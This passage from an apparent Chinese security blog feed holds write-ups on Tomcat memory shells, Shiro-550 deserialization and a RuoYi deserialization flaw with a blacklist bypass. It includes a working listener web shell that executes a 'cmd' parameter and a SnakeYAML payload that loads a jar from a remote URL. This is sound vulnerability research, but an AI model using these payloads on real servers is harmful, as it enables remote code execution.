class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>Listener</li></ul><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">package</span> com.p1ay2win.JavaWebMemoryShell.exploit;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.core.StandardContext;</span><br><span class="line"><span class="hljs-keyword">import</span> org.apache.catalina.loader.WebappClassLoaderBase;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="hljs-keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="hljs-keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="hljs-keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ListenerDemo</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">ServletRequestListener</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">ListenerDemo</span><span class="hljs-params">()</span> </span>&#123;</span><br><span class="line">        WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        <span class="hljs-keyword">if</span> (!Arrays.asList(standardContext.findApplicationListeners()).contains(<span class="hljs-keyword">this</span>.getClass().getName())) &#123;</span><br><span class="line">            standardContext.addApplicationListener(<span class="hljs-keyword">this</span>.getClass().getName());</span><br><span class="line">            standardContext.listenerStart();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestInitialized</span><span class="hljs-params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">if</span> (sre.getServletRequest().getParameter(<span class="hljs-string">"cmd"</span>) != <span class="hljs-keyword">null</span>)</span><br><span class="line">                Runtime.getRuntime().exec(sre.getServletRequest().getParameter(<span class="hljs-string">"cmd"</span>));</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-meta">@Override</span></span><br><span class="line">    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">requestDestroyed</span><span class="hljs-params">(ServletRequestEvent sre)</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>内存马除了使用StandardContext自带的方法加载，还可使用ApplicationContext的<code>addServlt</code>、<code>addFilter</code>和<code>addListener</code>方法加载，但之所以很少人使用这种方法，是因为<code>addXXX</code>方法都有下面这段代码，检测运行状态，不允许初始化后在添加组件。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">if</span> (!context.getState().equals(LifecycleState.STARTING_PREP)) &#123;</span><br><span class="line">    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalStateException(</span><br><span class="line">            sm.getString(<span class="hljs-string">"applicationContext.addXXX.ise"</span>,</span><br><span class="line">                    getContextPath()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>既然是属性，肯定是能够通过反射的方法修改它的值，然后绕过检测的，但本文因为篇幅问题就不给出实现代码了，也因为挺简单的，有兴趣的师傅可以试试。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这里插个题外话，跟一个安全研究的师兄聊天的时候聊到了内存马，我向他请教说为什么说是内存马，但Catalina目录下会生成内存马的<code>.class</code>和<code>.java</code>文件，不是无文件落地吗？还跟他探讨了一阵子。后来他意识到我是通过访问上传的jsp生成的内存马，而访问jsp文件时tomcat的机制是先从Catalina目录下找是否存在这个类，如果没有则会根据jsp文件生成HttpServlet类并编译，放到Catalina目录下，所以删除上传的jsp文件，Catalina目录下相应的内容也会被删除，但真正意义上的无文件还是通过反序列化实现。想想闹这出笑话也是6月份的时候了，感慨时间过得好快。😔</p><p>原本打算在文中也加上Spring内存马的内容，奈何Spring的启动流程比Tomcat复杂太多，Tomcat的调试也搞得我够呛的了，Spring的内容还是留在后续再研究吧。通过这次学习，感觉Java安全跟代码的相关性很强。加油吧，骚年</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&amp;mid=2652991099&amp;idx=1&amp;sn=a6c34bb344f105eb98fc6943c7439331&amp;scene=21#wechat_redirect%EF%BC%88%EF%BC%89" target="_blank" rel="noopener">https://mp.weixin.qq.com/s?__biz=MzIxMjEwNTc4NA==&amp;mid=2652991099&amp;idx=1&amp;sn=a6c34bb344f105eb98fc6943c7439331&amp;scene=21#wechat_redirect%EF%BC%88%EF%BC%89</a></p><p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/274466.html</a></p><p><a href="https://su18.org/post/memory-shell/" target="_blank" rel="noopener">https://su18.org/post/memory-shell/</a></p><p><a href="https://github.com/bitterzzZZ/MemoryShellLearn" target="_blank" rel="noopener">https://github.com/bitterzzZZ/MemoryShellLearn</a></p><p><a href="https://landgrey.me/blog/12/" target="_blank" rel="noopener">https://landgrey.me/blog/12/</a></p><p><a href="https://www.freebuf.com/articles/web/274466.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/274466.html</a></p><p><a href="https://www.cnblogs.com/colin-xun/p/10573504.html" target="_blank" rel="noopener">https://www.cnblogs.com/colin-xun/p/10573504.html</a></p><p><a href="https://blog.csdn.net/lblblblblzdx/article/details/80946526" target="_blank" rel="noopener">https://blog.csdn.net/lblblblblzdx/article/details/80946526</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;内存马之前有接触过，在阿里SRC的宙斯活动中薅了点羊毛，但当时只是会用，不了解他的原理。本文通过调试的方法了解内存马的原理，并实现常见的几种内存马。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="内存马" scheme="http://127.0.0.1/tags/内存马/"/>
    
  </entry>
  
  <entry>
    <title>没什么好分析的Shiro-550</title>
    <link href="http://127.0.0.1/2021/09/14/%E6%B2%A1%E4%BB%80%E4%B9%88%E5%A5%BD%E5%88%86%E6%9E%90%E7%9A%84Shiro-550/"/>
    <id>http://127.0.0.1/2021/09/14/%E6%B2%A1%E4%BB%80%E4%B9%88%E5%A5%BD%E5%88%86%E6%9E%90%E7%9A%84Shiro-550/</id>
    <published>2021-09-14T09:19:53.000Z</published>
    <updated>2021-09-14T09:19:56.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>陆陆续续分析了几个Java的安全漏洞，接下来轮到shiro的了。这里分析的是Shiro-550，硬编码rememberMe密钥造成的反序列化漏洞。分析起来比想象着的简单。</p><a id="more"></a><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>Shiro-550是使用shiro1.2.4及以下的默认密钥导致的反序列化漏洞，环境的代码我是用的<a href="https://github.com/xhycccc/Shiro-Vuln-Demo" target="_blank" rel="noopener">github</a>上一个大佬写的，使用的是Maven包管理，不用怎么搭，自动下载依赖直接运行即可。</p><h2 id="漏洞调试"><a href="#漏洞调试" class="headerlink" title="漏洞调试"></a>漏洞调试</h2><p>根据网上大部分的复现文章，使用ysoserial生成<code>CommonsBeanutils1</code>反序列化链的payload，并使用上面shiro漏洞环境项目的<code>GenPayload</code>类加密一下payload，生成shiro可识别的rememberMe内容。</p><p><img src="/2021/09/14/没什么好分析的Shiro-550/屏幕截图 2021-09-14 114741.png" alt></p><p>然后依旧是在<code>Runtime</code>的<code>exec</code>方法下断点，Cookie中设置rememberMe并发送。调用栈挺长的，但跟rememberMe有关的是从<code>AbstractRememberMeManager</code>开始这段。</p><p><img src="/2021/09/14/没什么好分析的Shiro-550/屏幕截图 2021-09-14 115333.png" alt></p><p>跟进到<code>AbstractRememberMeManager</code>的<code>getRememberedPrincipals</code>方法。看到<code>bytes</code>变量的内容为加密后的序列化链，跟进<code>getRememberedSerializedIdentity</code>方法看看是如何获取rememberMe内容的。</p><p><img src="/2021/09/14/没什么好分析的Shiro-550/20210914144923.png" alt></p><p><code>getRememberedSerializedIdentity</code>方法在<code>AbstractRememberMeManager</code>类中是抽象方法，具体的实现代码要去到<code>AbstractRememberMeManager</code>的子类<code>CookieRememberMeManager</code>中看。整体就是从Cookie中获取rememberMe内容，并返回base64解码的内容。rememberMe的内容是通过<code>this.getCookie()</code>获取当前的<code>cookie</code>对象，而<code>cookie</code>初始化时是用<code>rememberMe</code>这个名称的，获取到的内容相应的也该名称的值。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">byte</span>[] getRememberedSerializedIdentity(SubjectContext subjectContext) &#123;</span><br><span class="line">    <span class="hljs-keyword">if</span> (!WebUtils.isHttp(subjectContext)) &#123;</span><br><span class="line">        ...</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">        WebSubjectContext wsc = (WebSubjectContext)subjectContext;</span><br><span class="line">        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isIdentityRemoved(wsc)) &#123;</span><br><span class="line">            <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">        &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">            HttpServletRequest request = WebUtils.getHttpRequest(wsc);</span><br><span class="line">            HttpServletResponse response = WebUtils.getHttpResponse(wsc);</span><br><span class="line">            String base64 = <span class="hljs-keyword">this</span>.getCookie().readValue(request, response);</span><br><span class="line">            <span class="hljs-keyword">if</span> (<span class="hljs-string">"deleteMe"</span>.equals(base64)) &#123;</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (base64 != <span class="hljs-keyword">null</span>) &#123;</span><br><span class="line">                base64 = <span class="hljs-keyword">this</span>.ensurePadding(base64);</span><br><span class="line">                ...</span><br><span class="line">                <span class="hljs-keyword">byte</span>[] decoded = Base64.decode(base64);</span><br><span class="line">                ...</span><br><span class="line">                <span class="hljs-keyword">return</span> decoded;</span><br><span class="line">            &#125; <span class="hljs-keyword">else</span> &#123;</span><br><span class="line">                <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>获取到字节数组为非空的话会继续调用<code>convertBytesToPrincipals</code>方法，在<code>convertBytesToPrincipals</code>方法中先调用<code>decrypt</code>方法对rememberMe进行解密。shiro使用的是AES加密，按理说还具有初始化向量<code>iv</code>，但解密时候的<code>iv</code>是从rememberMe的开头获取的，所以不影响payload的构造。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> ByteSource <span class="hljs-title">decrypt</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] ciphertext, <span class="hljs-keyword">byte</span>[] key)</span> <span class="hljs-keyword">throws</span> CryptoException </span>&#123;</span><br><span class="line">    <span class="hljs-keyword">byte</span>[] encrypted = ciphertext;</span><br><span class="line">    <span class="hljs-keyword">byte</span>[] iv = <span class="hljs-keyword">null</span>;</span><br><span class="line">    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span>.isGenerateInitializationVectors(<span class="hljs-keyword">false</span>)) &#123;</span><br><span class="line">        <span class="hljs-keyword">try</span> &#123;</span><br><span class="line">            <span class="hljs-keyword">int</span> ivSize = <span class="hljs-keyword">this</span>.getInitializationVectorSize();</span><br><span class="line">            <span class="hljs-keyword">int</span> ivByteSize = ivSize / <span class="hljs-number">8</span>;</span><br><span class="line">            iv = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[ivByteSize];</span><br><span class="line">            System.arraycopy(ciphertext, <span class="hljs-number">0</span>, iv, <span class="hljs-number">0</span>, ivByteSize);</span><br><span class="line">            <span class="hljs-keyword">int</span> encryptedSize = ciphertext.length - ivByteSize;</span><br><span class="line">            encrypted = <span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[encryptedSize];</span><br><span class="line">            System.arraycopy(ciphertext, ivByteSize, encrypted, <span class="hljs-number">0</span>, encryptedSize);</span><br><span class="line">        &#125; <span class="hljs-keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">            String msg = <span class="hljs-string">"Unable to correctly extract the Initialization Vector or ciphertext."</span>;</span><br><span class="line">            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> CryptoException(msg, var8);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">return</span> <span class="hljs-keyword">this</span>.decrypt(encrypted, key, iv);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接着是对解密后的内容进行反序列化，最终调用方的是<code>DefaultSerializer</code>类的<code>deserialize</code>方法。这里实例化<code>ObjectInputStream</code>类是用他的子类<code>ClassResolvingObjectInputStream</code>是实现的。</p><p><img src="/2021/09/14/没什么好分析的Shiro-550/屏幕截图 2021-09-14 164412.png" alt></p><p><code>ClassResolvingObjectInputStream</code>的<code>resolveClass</code>方法是通过<code>forName</code>方法返回Class实例的，但<code>forName</code>不支持数组类型的Class，所以反序列化的利用链没使用<code>CommonsCollections</code>的，而是用了<code>CommonsBeanutils1</code>。因为事先看了别的师傅复现的文章，所以没有踩这个坑。具体的<code>forName</code>原理在@zsx师傅的<a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">文章</a>里有详尽的分析。除此之外，后面的反序列化就与普通的反序列化无异。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><code>CommonsBeanutils1</code>里的<code>TemplatesImpl</code>在上回Java反序列化的文章里没有学到，好像fastjson不出网的payload是有用到这个的，后续还还要补充学习。冲冲冲</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.cnblogs.com/loong-hon/p/10619616.html" target="_blank" rel="noopener">https://www.cnblogs.com/loong-hon/p/10619616.html</a></p><p><a href="https://p2hm1n.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">https://p2hm1n.com/2020/12/03/Shiro550-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</a></p><p><a href="https://www.mi1k7ea.com/2020/10/03/%E6%B5%85%E6%9E%90Shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88Shiro550%EF%BC%89/#%E9%83%A8%E5%88%86Gadget%E6%89%93%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%9D%91" target="_blank" rel="noopener">https://www.mi1k7ea.com/2020/10/03/%E6%B5%85%E6%9E%90Shiro-rememberMe%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%EF%BC%88Shiro550%EF%BC%89/#%E9%83%A8%E5%88%86Gadget%E6%89%93%E5%A4%B1%E8%B4%A5%E7%9A%84%E5%9D%91</a></p><p><a href="http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/#4-%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F" target="_blank" rel="noopener">http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/#4-%E4%BF%AE%E5%A4%8D%E6%96%B9%E5%BC%8F</a></p><p><a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">https://blog.zsxsoft.com/post/35</a></p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;陆陆续续分析了几个Java的安全漏洞，接下来轮到shiro的了。这里分析的是Shiro-550，硬编码rememberMe密钥造成的反序列化漏洞。分析起来比想象着的简单。&lt;/p&gt;</summary>
    
    
    
    <category term="代码审计" scheme="http://127.0.0.1/categories/代码审计/"/>
    
    
    <category term="反序列化" scheme="http://127.0.0.1/tags/反序列化/"/>
    
  </entry>
  
  <entry>
    <title>若依反序列漏洞复现及其修复绕过</title>
    <link href="http://127.0.0.1/2021/09/04/%E8%8B%A5%E4%BE%9D%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D%E7%BB%95%E8%BF%87/"/>
    <id>http://127.0.0.1/2021/09/04/%E8%8B%A5%E4%BE%9D%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%85%B6%E4%BF%AE%E5%A4%8D%E7%BB%95%E8%BF%87/</id>
    <published>2021-09-04T09:11:53.000Z</published>
    <updated>2022-04-11T15:20:32.308Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>学完了Java反序列化，在CNVD上找了个有Java反序列化漏洞的系统练练手，叫若依后台管理系统，在github上的star数也不少。我是挺喜欢这个名字的，<strong>你若不离不弃、我必生死相依</strong>，这个寓意可是作者的官方解读，不是我瞎编的。😆</p><a id="more"></a><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>主要是看看有没有代码审计的文章，搜了下发现有一篇简单审计这个反序列化漏洞的文章，在官网上还十分良心的给出了历史漏洞。在历史漏洞里给出了Poc和修复方案。</p><p><img src="/2021/09/04/若依反序列漏洞复现及其修复绕过/屏幕截图 2021-08-29 091602.png" alt></p><p>可以初步得知漏洞出现在定时任务的<code>SysJobController</code>控制器里，三个POC的前两个是JNDI注入，后一个是yaml反序列化。</p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>漏洞复现这里使用yaml反序列化的payload来复现。在github上下载<a href="https://github.com/artsploit/yaml-payload" target="_blank" rel="noopener">yaml-payload</a>并编译打包成jar包，并使用python的<code>SimpleHTTPServer</code>模块起一个HTTP服务用来下载恶意jar包。然后，在后台系统监控的定时任务里加上以下一条任务。</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">org.yaml.snakeyaml.Yaml.load(&apos;!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [&quot;http://127.0.0.1:8000/yaml-payload.jar&quot;]]]]&apos;)</span><br></pre></td></tr></table></figure><p>然后，IDEA里在<code>Runtime</code>的<code>exec</code>方法下个断点，并在相应定时任务的更多操作里执行一次任务。在调用栈里可看到，项目里的方法调用有四个，其他两块的调用栈分别是quartz任务调度框架和snakeyaml的栈。</p><p><img src="/2021/09/04/若依反序列漏洞复现及其修复绕过/屏幕截图 2021-08-31 143701.png" alt></p><p>跟进<code>AbstractQuartzJob</code>的<code>execute</code>方法，这个方法是由quartz任务调度框架调用的，由quartz的文档可知每个实现<code>Job</code>接口的类为一个任务，这个类还需重写<code>execute</code>方法来实现任务的执行内容。在这个<code>execute</code>方法里，它实例化了一个<code>SysJob</code>类，并调用了<code>doExecute</code>方法。调用的<code>doExecute</code>方法是子类<code>QuartzDisallowConcurrentExecution</code>，功能只是再继续调用<code>JobInvokeUtil</code>的<code>invokeMethod</code>静态方法。</p><p>继续跟进到<code>invokeMethod</code>方法，才有一些实质性的逻辑代码。开头调用目标、类名、方法名和方法参数。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">invokeMethod</span><span class="hljs-params">(SysJob sysJob)</span> <span class="hljs-keyword">throws</span> Exception</span></span><br><span class="line"><span class="hljs-function"></span>&#123;</span><br><span class="line">    String invokeTarget = sysJob.getInvokeTarget();</span><br><span class="line">    String beanName = getBeanName(invokeTarget);</span><br><span class="line">    String methodName = getMethodName(invokeTarget);</span><br><span class="line">    List&lt;Object[]&gt; methodParams = getMethodParams(invokeTarget);</span><br><span class="line"></span><br><span class="line">    <span class="hljs-keyword">if</span> (!isValidClassName(beanName))</span><br><span class="line">    &#123;</span><br><span class="line">        Object bean = SpringUtils.getBean(beanName);</span><br><span class="line">        invokeMethod(bean, methodName, methodParams);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        Object bean = Class.forName(beanName).newInstance();</span><br><span class="line">        invokeMethod(bean, methodName, methodParams);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要注意的是获取方法参数这里，<strong>只能获取<code>String</code>、<code>boolen</code>、<code>long</code>、<code>double</code>和<code>int</code>类型的参数</strong>。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> List&lt;Object[]&gt; getMethodParams(String invokeTarget)</span><br><span class="line">&#123;</span><br><span class="line">    String methodStr = StringUtils.substringBetween(invokeTarget, <span class="hljs-string">"("</span>, <span class="hljs-string">")"</span>);</span><br><span class="line">    <span class="hljs-keyword">if</span> (StringUtils.isEmpty(methodStr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String[] methodParams = methodStr.split(<span class="hljs-string">","</span>);</span><br><span class="line">    List&lt;Object[]&gt; classs = <span class="hljs-keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>; i &lt; methodParams.length; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        String str = StringUtils.trimToEmpty(methodParams[i]);</span><br><span class="line">        <span class="hljs-comment">// String字符串类型，包含'</span></span><br><span class="line">        <span class="hljs-keyword">if</span> (StringUtils.contains(str, <span class="hljs-string">"'"</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            classs.add(<span class="hljs-keyword">new</span> Object[] &#123; StringUtils.replace(str, <span class="hljs-string">"'"</span>, <span class="hljs-string">""</span>), String.class &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="hljs-comment">// boolean布尔类型，等于true或者false</span></span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.equals(str, <span class="hljs-string">"true"</span>) || StringUtils.equalsIgnoreCase(str, <span class="hljs-string">"false"</span>))</span><br><span class="line">            ...</span><br><span class="line">        <span class="hljs-comment">// long长整形，包含L</span></span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(str, <span class="hljs-string">"L"</span>))</span><br><span class="line">            ...</span><br><span class="line">        <span class="hljs-comment">// double浮点类型，包含D</span></span><br><span class="line">        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (StringUtils.containsIgnoreCase(str, <span class="hljs-string">"D"</span>))</span><br><span class="line">            ...</span><br><span class="line">        <span class="hljs-comment">// 其他类型归类为整形</span></span><br><span class="line">        <span class="hljs-keyword">else</span></span><br><span class="line">            ...</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="hljs-keyword">return</span> classs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>后续正常类名会进入<code>else</code>代码体，通过<code>newInstance</code>方法获得传入类名的<strong>无参构造方法实例化的对象</strong>，然后使用对象、方法名和方法参数调用另一个重载的<code>invokeMethod</code>方法。这个重载的<code>invokeMethod</code>方法就是实现反射调用方法的功能，这里就是不细说了。至于POC中JNDI注入，上一篇文章有分析，这里也不细说了，而yaml怎么实现的反序列化，本文也不展开，在后续的文章中再仔细分析。</p><p>通过以上的调用栈的分析，可得出以下构造若依反序列化漏洞payload的条件：</p><ul><li>入口类只可进行一次反射调用</li><li>入口类需可被实例化，并具有默认的无参构造方法</li><li>调用的类方法需为无参或参数为<code>String</code>、<code>boolen</code>、<code>long</code>、<code>double</code>和<code>int</code>几种类型</li></ul><h2 id="过滤不严"><a href="#过滤不严" class="headerlink" title="过滤不严"></a>过滤不严</h2><p>回到官网，作者给出的修复方案是过滤<code>rmi</code>、<code>ldap</code>、<code>http</code>字符串，对应的是作者给出的三个POC。那还有其他协议可以实现反序列化吗？答案是肯定的， 虽然官方文档好像没有给出<code>URL</code>类支持的协议，但可以使用以下验证支持那种协议。</p><figure class="highlight java hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> 